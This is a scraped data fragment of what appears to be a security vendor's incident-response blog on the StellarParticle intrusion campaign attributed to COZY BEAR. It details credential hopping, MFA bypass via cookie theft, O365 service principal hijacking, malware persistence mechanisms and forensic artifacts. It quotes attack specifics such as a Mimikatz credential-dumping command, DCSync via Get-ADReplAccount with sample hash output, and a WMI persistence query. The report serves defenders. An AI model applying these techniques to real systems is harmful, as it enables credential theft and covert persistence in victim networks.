                "After this, the threat actor navigated to the userâs Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the userâs Chrome history intact.",
                "CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partnersâ O365 tenants.",
                "This threat actor abused access to accounts in the Cloud Solution Partnerâs environment with legitimate delegated administrative privileges to then gain access to several customersâ O365 environments.",
                "By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.",
                "These cross-tenant sign-ins were identified by looking for values in the resourceTenantId attribute that did not match the Cloud Solution Partnerâs own Azure tenant ID.",
                "CrowdStrike also identified a limitation within Microsoftâs Delegated Administration capabilities for Microsoft Cloud Solution Partners.",
                "While a normal O365 administrator can be provided dozens of specific administrative roles to limit the privileges granted, this same degree of customization cannot be applied to Microsoft Cloud Solution Partners that use the delegated administrator functionality in O365.",
                "For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customerâs environment, Admin agent or Helpdesk agent.2 The Helpdesk agent role provides very limited access that is equivalent to a password admin role, whereas the Admin agent role provides broad access more equivalent to global administrator.",
                "This limitation is scheduled to be resolved in 2022 via Microsoftâs scheduled feature, Granular Delegated Admin Privileges (GDAP).3",
                "The Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases.",
                "In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant.Â",
                "The UAL database is available by default on Server editions of Windows starting with Server 2012.",
                "This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default.",
                "UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred.",
                "One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.",
                "An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here.",
                "In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.",
                "Even though itâs only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.",
                "For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.",
                "This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.",
                "Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.",
                "Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer.",
                "Attempted to blend in with a file name that matched the system name it resided on",
                "Configured for WMI persistence (generally uncommon in 2019)",
                "Used likely compromised infrastructure for C2",
                "Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests",
                "TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.",
                "The malware shares high-level functionality with other malware families.",
                "In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.",
                "TrailBlazer persists on a compromised host using WMI event subscriptions4 â a technique also used by SeaDuke â although this persistence mechanism is not exclusive to COZY BEAR.5",
                "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime < 480",
                "In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system’s uptime was between 180 and 480 seconds.Â",
                "Attempted to blend in with a file name that matched the system name it resided on",
                "Configured for persistence via a crontab entry with a @reboot lineÂ",
                "Used likely compromised infrastructure for C2",
                "GoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks.",
                "Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux platform that the threat actor deployed in mid-2019.",
                "This variant extends the backdoorâs known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows.",
                "The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant.",
                "The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections.",
                "It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.",
                "Persistence was established via a crontab entry for a non-root user.",
                "With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.",
                "Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.",
                "Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.",
                "While the scriptâs contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.Â",
                "In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.",
                "After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victimsâ various domains.",
                "In addition, the randomly named directories are typically created in a previously existing directory thatâs one level off of the root of the C drive.",
                "The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.",
                "To date, the names of the directories have always been formed from lowercase alphanumeric characters.",
                "For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where âXXâ is a previously existing directory on the system):",
                "In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.",
                "This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename).",
                "In addition, the Jump List for wscript.exe contained evidence of the VBScript files.",
                "The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in.",
                "Two examples are env.vbs and WinNet.vbs.",
                "Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary.",
                "Across multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims’ internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics.",
                "While operating in the victim’s internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided.",
                "This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks.",
                "Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.",
                "In some instances these points of contact were subsequently targeted for further data collection.",
                "The threat actor’s wiki access could be considered an extension of “Credential Hopping” described earlier.",
                "The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.",
                "CrowdStrike observed the threat actor accessing the wiki as users who would be considered “non-privileged” from an Active Directory perspective but had access to sensitive data specific to the victim’s products or services.",
                "At this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations.",
                "CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor.",
                "Given the threat actor’s penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations.",
                "CrowdStrike recommends the following best practices for internal information repositories:",
                "Ensure logs are centralized and stored for at least 180 days",
                "Create detections for anomalous activity such as access from an unusual location like a server subnet",
                "Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA",
                "The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.",
                "Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victimâs O365 tenant and began performing enumeration queries.",
                "These queries were recorded in text-based logs that existed under the path",
                "Similar logs (for Azure AD instead of O365) can be found under the path:",
                "While the logs didnât include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victimâs O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server).",
                "The logs contained commands issued and the count of the results returned for a specific command.",
                "The commands included enumeration queries such as:",
                "In this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed.",
                "By taking the timestamp that the command was executed via the PowerShell logs on the local system, CrowdStrike analyzed the configuration settings in the victimâs O365 tenant and discovered that a new secret had been added to a built-in Microsoft Azure AD Enterprise Application, Microsoft StaffHub Service Principal, which had Application level permissions.",
                "Further, the newly added secret was set to remain valid for more than a decade.",
                "This data was acquired by exporting the secrets and certificates details for each Azure AD Enterprise Application.",
                "The Service Principal (now renamed to Microsoft Teams Shifts) had the following permissions at the time the configuration settings were collected:",
                "CrowdStrike was unable to find Microsoft documentation, but based on open-source research,7 this application likely had the following permissions around the time of registration:",
                "The most notable permissions above are the Mail.Read, Files.Read and Member.ReadWriteÂ  permissions.",
                "These permissions would allow the threat actor to use the Microsoft Staffhub service principal to read all mail and SharePoint/OneDrive files in the organization, as well as create new accounts and assign administrator privileges to any account in the organization.Â",
                "By running the commands from within the victimâs environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8 However, as explained earlier, the threat actor managed to continue to access the victimâs cloud environment even when the victim enforced MFA for all connections regardless of source.",
                "While the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud.",
                "This information was stored under the registry path.",
                "Below is an example of the registry data:",
                "Example registry entry showing target O365 email accounts",
                "The same WSMan connection string was also located in the userâs NTUSER.DAT registry hive under the path:",
                "While not strictly related to the O365 PowerShell activity, the Windows Event Log Microsoft-Windows-WinRM%4Operational.evtx also included information on connection attempts made to external O365 tenants.",
                "This information was logged under Event ID 6.",
                "Below is an example of what the event included:",
                "Windows Event Log entry showing connection to O365 tenants",
                "The threat actor also deployed several layers of persistence utilizing both pre-existing and threat actor-created Service Principals with the ultimate goal of gaining global access to email.",
                "First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.",
                "This Service Principal was granted company administrator privileges.",
                "From there, the threat actor added a credential to this Service Principal so that they could access the Service Principal directly, without use of an O365 user account.",
                "These actions were recorded in Unified Audit Logs with the following three operation names:",
                "Next, the threat actor utilized the threat actor-created Service Principal to take control of a second Service Principal.",
                "This was done by adding credentials to this second Service Principal, which was legitimately created by the company.",
                "This now compromised company-created Service Principal had mail.read graph permissions consented on behalf of all users within the tenant.",
                "This action was recorded by just one operation type in Unified Audit Logs.",
                "This operation type is named Add service principal credentials.",
                "Finally, the threat actor utilized the compromised Service Principal with the assignedÂ  mail.read permissions to then read emails of several different users in the companyâs environment.",
                "CrowdStrike was able to use the Unified Audit Logsâ (UAL) MailItemsAccessed operation events to see the exact emails the threat actor viewed, as the majority of the users in the tenant were assigned O365 E5 licenses.",
                "When performing analysis on the UAL, CrowdStrike used the ClientAppId value within the MailItemsAccessed operation and cross-correlated with the Application ID of the compromised service principal to see what activities were performed by the threat actor.",
                "Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation9 role.",
                "When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.",
                "These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect.",
                "While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command:",
                "CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise.",
                "The threat actor attempted to remotely list running processes on systems using tasklist.exe.",
                "As tasklist uses WMI âunder the hood,â this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.",
                "Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.",
                "A sample of the information included with this event is below:",
                "Event ID 10028 showing failed execution of remote tasklist",
                "This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.",
                "While unproven, itâs possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.",
                "This is because a current or recent Chrome session to the victimâs cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victimâs cloud resources.",
                "In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.",
                "Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.",
                "There was little to no activity during the (S)FTP sessions.",
                "This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to whatâs described in the Credential Hopping section earlier.",
                "Some of the accounts used were not in the victimâs Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.",
                "However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victimâs environment.Â",
                "After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.",
                "The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.",
                "Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.",
                "This resulted in a prompt being displayed to the threat actor that included an MFA setup link.",
                "The threat actor subsequently set up MFA for the account and successfully connected to the victimâs network via VPN.",
                "During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victimâs environment.",
                "This again showed a strong knowledge of the victimâs internal environment on the part of the threat actor.",
                "Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).",
                "This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations.",
                "In one example, the threat actor connected into the victimâs environment via a VPN endpoint that did not have MFA enabled.",
                "Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.",
                "The threat actor subsequently ran the DSInternals command Get-ADReplAccount targeting two of the victimâs domains.",
                "This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.",
                "A common name for this particular technique is DCSync.11",
                "An example output from Get-AdReplAccount is below:",
                "SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative",
                "When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.",
                "This was necessary, as the threat actor was targeting multiple domains.",
                "The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration.",
                "The fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed.",
                "On some investigations, the dwell time of the threat actor spanned years.",
                "Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.",
                "To combat this, the threat actor periodically “refreshed” their credential set by performing credential theft activities in an already compromised environment.",
                "At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.Â",
                "One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.",
                "While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.",
                "CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script’s execution was logged automatically due to the use of specific keywords.",
                "CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.",
                "In addition to refreshing the threat actor’s credentials, the threat actor would also refresh their understanding of the victim’s AD environment.",
                "Around the time when the threat actor executed Get-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.",
                "In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.",
                "The usage of renamed AdFind is consistent with other industry reporting on this campaign.Â",
                "In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.",
                "This information provided the adversary with a list of accounts possessing particular privileges â in this case, the ability to make VPN connections â that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.",
                "In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.",
                "CrowdStrike determined that in these cases, administrative users had âresetâ their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.",
                "This was possible even though the customerâs Active Directory was configured to require new passwords to be different from the previous five passwords for a given account.",
                "Unfortunately, this check only applies when a user is changing their password via the âpassword changeâ method â but if a âpassword resetâ is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a userâs account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.",
                "The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actorâs extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months â and in some cases, years.Â",
                "A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.",
                "The following table maps TTPs covered in this article to the MITRE ATT&CKÂ® framework.",
                "The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals",
                "T1003.001: OS Credential Dumping: LSASS Memory",
                "The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory and encrypt the output",
                "A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment",
                "The threat actor used VPNs to gain access to systems and persist in the environment",
                "T1555.003: Credentials from Password Stores: Credentials from Web Browsers",
                "The threat actor exported saved passwords from user’s Chrome browser installations",
                "The threat actor stole web session cookies from end user workstations and used them to access cloud resources",
                "T1021.001: Remote Services: Remote Desktop Protocol",
                "The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system",
                "The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.",
                "The Threat actor also used valid accounts to create persistence within the environment.",
                "T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription",
                "TrailBlazer was configured to execute after a reboot via a command-line event consumer",
                "T1036.005: Masquerading: Match Legitimate Name or Location",
                "The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system’s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).",
                "Additionally, the threat actor renamed their systems prior to connecting to victim’s VPNs to match the victim’s system naming convention",
                "T1069.002: Permission Groups Discovery: Domain Groups",
                "The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory",
                "T1550.001: Use Alternate Authentication Material: Application Access Token",
                "The threat actor used compromised service principals to make changes to the Office 365 environment.",
                "The threat actor accessed data from Information Repositories",
                "T1098.001: Account Manipulation: Additional Cloud Credentials",
                "The threat actor added credentials to O365 Service Principals",
                "The threat actor created new O365 Service Principals to maintain access to victim’s environments",
                "The threat actor regularly interrogated other systems using tasklist.exe",
                "T1595.001: Active Scanning: Scanning IP Blocks",
                "The threat actor probed external services in an attempt to regain access to the environment",
                "Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now.",
                "Learn more about Falcon OverWatch proactive managed threat hunting.",
                "Watch this video to see how Falcon OverWatch proactively hunts for threats in your environment.",
                "Learn more about the CrowdStrike FalconÂ® platform by visiting the product webpage.",
                "Test CrowdStrike next-gen AV for yourself.",
                "Start your free trial of Falcon Prevent™ today.",
                "Better Together: The Power of Managed Cybersecurity Services in the Face of Pressing Global Security Challenges",
                "The results from the 2021 Global Security Attitude Survey paint a bleak picture of how organizations globally are feeling about the cybersecurity landscape before them.",
                "Organizations are grappling with shortages of cybersecurity skills and a lack of capability to detect and contain intrusions in a timely way.",
                "This comes against a backdrop of persistent ransomware […]",
                "Mind the MPLog: Leveraging Microsoft Protection Logging for Forensic Investigations",
                "In an incident response investigation, CrowdStrike analysts use multiple data points to parse the facts of who, what, when and how.",
                "As part of that fact-finding mission, analysts investigating Windows systems leverage the Microsoft Protection Log (MPLog), a forensic artifact on Windows operating systems that offers a wealth of data to support forensic investigations.",
                "CrowdStrike Services Offers Incident Response Tracker for the DFIR Community",
                "The CrowdStrike Incident Response Tracker is a convenient spreadsheet that includes sections to document indicators of compromise, affected accounts, compromised systems and a timeline of significant events CrowdStrike incident response teams have leveraged this type of tracker in thousands of investigations Download the CrowdStrike Incident Response Tracker Template During a recent client engagement for a […]",
                "Sign up now to receive the latest notifications and updates from CrowdStrike.",
                "Detect, prevent, and respond to attacksâ even malware-free intrusionsâat any stage, with next-generation endpoint protection.",
                "BERT Embeddings: A New Approach for Command Line Anomaly Detection",
                "TRY CROWDSTRIKE FREE FOR 15 DAYS",
                "GET STARTED WITH A FREE TRIAL",
                "This site is registered on wpml.org as a development site."
            ],
            "sentencesNum": 279,
            "words": [
                "From The Front Lines",
                "These techniques include:",
                "Credential theft using Get-ADReplAccount",
                "Credential Hopping",
                "Figure 1.",
                "Example of âcredential hoppingâ technique",
                "Cookie Theft to Bypass MFA",
                "Figure 2.",
                "Figure 3.",
                "Figure 4.",
                "O365 Delegated Administrator Abuse",
                "User Access Logging (UAL)",
                "TrailBlazer and GoldMax",
                "TrailBlazer",
                "WMI event filter",
                "WMI Event consumer (CommandLineTemplate)",
                "C:\\Program Files (x86)\\Common Files\\Adobe\\<FILENAME>.exe",
                "Filter to consumer binding",
                "CommandLineEventConsumer.Name=\"<GUID1>\"|__EventFilter.Name=\"<GUID2>\"",
                "Table 1.",
                "TrailBlazer WMI Persistence",
                "GoldMax (Linux variant)",
                "Figure 5.",
                "Crontab entry for GoldMax persistence",
                "Enumeration Tools/Unique Directory Structure",
                "C:\\XX\\[a-z0-9]{6}",
                "C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}",
                "C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain.FQDN",
                "C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain-2.FQDN",
                "Internal Wiki Access",
                "Enable detailed access loggingÂ",
                "O365 Built-in Service Principal HijackingÂ",
                "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Office365\\Powershell\\.",
                "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\AzureAD\\Powershell\\.",
                "ListAccountSkus",
                "ListPartnerContracts",
                "ListServicePrincipals",
                "ListServicePrincipalCredentials",
                "ListRoles",
                "ListRoleMembers",
                "ListUsers",
                "ListDomains",
                "GetRoleMember",
                "GetPartnerInformation",
                "GetCompanyInformation",
                "Member.Read",
                "Member.Read.All",
                "Member.ReadWrite",
                "Member.ReadWrite.All",
                "Shift.Read",
                "Shift.Read.All",
                "Shift.ReadWrite",
                "Shift.ReadWrite.All",
                "Team.Read",
                "Team.Read.All",
                "Team.ReadWrite",
                "Team.ReadWrite.All",
                "User.Read.All",
                "User.ReadWrite.All",
                "WebHook.Read.All",
                "WebHook.ReadWrite.All",
                "Mail.Read",
                "Group.Read.All",
                "Files.Read.All",
                "Group.ReadWrite.All",
                "Figure 6.",
                "Figure 7.",
                "WSMan connection string registry location",
                "Figure 8.",
                "O365 Company Service Principal ManipulationÂ",
                "Attacker-created Service Principal",
                "Add service principal",
                "Add member to role",
                "Add service principal credentials.",
                "Update Service Principal",
                "Company-Created Service Principal Hijacking",
                "Mail.Read Service Principal Abuse",
                "O365 Application Impersonation",
                "Get-ManagementRoleAssignment -Role ApplicationImpersonation.",
                "Remote Tasklist",
                "Figure 9.",
                "FTP Scanning/Identity Knowledge",
                "TA Masquerading of System Names",
                "Credential Theft Using Get-ADReplAccount",
                "DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local",
                "Sid: S-1-5-21-1432446722-301123485-1266542393-2012",
                "Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567",
                "SamAccountName: TestUser",
                "SamAccountType: User",
                "UserPrincipalName: TestUser@demo.local",
                "PrimaryGroupId: 513",
                "SidHistory:",
                "Enabled: True",
                "UserAccountControl: NormalAccount",
                "AdminCount: True",
                "Deleted: False",
                "LastLogonDate: 12/2/2021 1:41:46 PM",
                "DisplayName: TestUser",
                "GivenName: Test",
                "Surname: User",
                "Description: Admin Account",
                "ServicePrincipalName:",
                "Owner: S-1-5-21-1432446722-301123485-1266542393-512",
                "Secrets",
                "NTHash: 84a058676bb6d7de4237e18f09b91156",
                "LMHash:",
                "NTHashHistory:",
                "Hash 01: 84a058676bb6d7de4237e18f09b91156",
                "Hash 02: e047ebb3b7c463928c928fca95ac0ac8",
                "Hash 03: 6dc3cdb3e559ef00d3521351ace7477e",
                "Hash 04: a88355849f35fe7336de23a4ca3e6a9e",
                "Hash 05: de9bde95677672295349aa6e1e857704",
                "LMHashHistory:",
                "Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668",
                "Hash 02: 6a028636a6f52491424586bb88357f7c",
                "Hash 03: c13ef7347853dc3be7e7259fdc8818a1",
                "Hash 04: 6635151746869ce485246037747adae1",
                "Hash 05: 85543f498b007e07a3da662c8a9d450b",
                "SupplementalCredentials:",
                "ClearText:",
                "NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649",
                "Kerberos:",
                "Credentials:",
                "DES_CBC_MD5",
                "Key: 0013364f00003915",
                "DES_CBC_CRC",
                "Key: 0013364f00003915",
                "OldCredentials:",
                "DES_CBC_MD5",
                "Key: 00002a46000004bc",
                "DES_CBC_CRC",
                "Key: 00002a46000004bc",
                "Salt: demo.localTestUser",
                "Flags: 0",
                "KerberosNew:",
                "Credentials:",
                "AES256_CTS_HMAC_SHA1_96",
                "Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f",
                "Iterations: 4096",
                "AES128_CTS_HMAC_SHA1_96",
                "Key: f67c2bcbfcfa30fccb36f72dca22a817",
                "Iterations: 4096",
                "DES_CBC_MD5",
                "Key: 00002f34000004ee",
                "Iterations: 4096",
                "DES_CBC_CRC",
                "Key: 00002f34000004ee",
                "Iterations: 4096",
                "OldCredentials:",
                "AES256_CTS_HMAC_SHA1_96",
                "Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f",
                "Iterations: 4096",
                "AES128_CTS_HMAC_SHA1_96",
                "Key: dc34bfd5e469edbeada77fac56aa35ae",
                "Iterations: 4096",
                "DES_CBC_MD5",
                "Key: 0000345400000520",
                "Iterations: 4096",
                "DES_CBC_CRC",
                "Key: 0000345400000520",
                "Iterations: 4096",
                "OlderCredentials:",
                "AES256_CTS_HMAC_SHA1_96",
                "Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087",
                "Iterations: 4096",
                "AES128_CTS_HMAC_SHA1_96",
                "Key: c38dfbd6c00b5f3b010a07f9e824fc38",
                "Iterations: 4096",
                "DES_CBC_MD5",
                "Key: 000039a500000551",
                "Iterations: 4096",
                "DES_CBC_CRC",
                "Key: 000039a500000551",
                "Iterations: 4096",
                "ServiceCredentials:",
                "Salt: demo.localTestUser",
                "DefaultIterationCount: 4096",
                "Flags: 0",
                "WDigest:",
                "Hash 01: 83ed141ab0eaf1ff7694147ba97e1994",
                "Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574",
                "Hash 03: 0c228c5816a79e561d999d489499a12a",
                "Hash 04: 83ed141ab0eaf1ff7694147ba97e1994",
                "Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574",
                "Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93",
                "Hash 07: 83ed141ab0eaf1ff7694147ba97e1994",
                "Hash 08: 10265b08a3bb710da516832eaf64368a",
                "Hash 09: 10265b08a3bb710da516832eaf64368a",
                "Key Credentials:",
                "Credential Roaming",
                "Created:",
                "Modified:",
                "Credentials:",
                "Figure 10.",
                "Get-ADReplAccount example output",
                "Credential Refresh",
                "Password Policies/Hygiene",
                "Close Out",
                "Endnotes",
                "https://us-cert.cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Russian_SVR_Activities_Related_to_SolarWinds_Compromise_508C.pdf",
                "https://docs.microsoft.com/en-us/partner-center/permissions-overviewÂ",
                "https://docs.microsoft.com/en-us/partner-center/announcements/2021-december#9Â",
                "https://attack.mitre.org/techniques/T1546/003/",
                "CrowdStrike Premium Intelligence Report",
                "https://attack.mitre.org/techniques/T1213/001/",
                "https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",
                "https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authentication",
                "https://docs.microsoft.com/en-us/exchange/applicationimpersonation-role-exchange-2013-help",
                "https://github.com/MichaelGrafnetter/DSInternals",
                "https://attack.mitre.org/techniques/T1003/006/Â Â",
                "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/bbee5135-3db2-4824-873a-55104c3610ad",
                "MITRE ATT&CK Framework",
                "Tactic",
                "Technique",
                "Observable",
                "Credential Access",
                "T1003.006 OS Credential Dumping: DCSync",
                "Credential Access",
                "Initial Access / Persistence",
                "T1078.003: Valid Accounts: Local Accounts",
                "Initial Access / Persistence",
                "T1133: External Remote Services",
                "Credential Access",
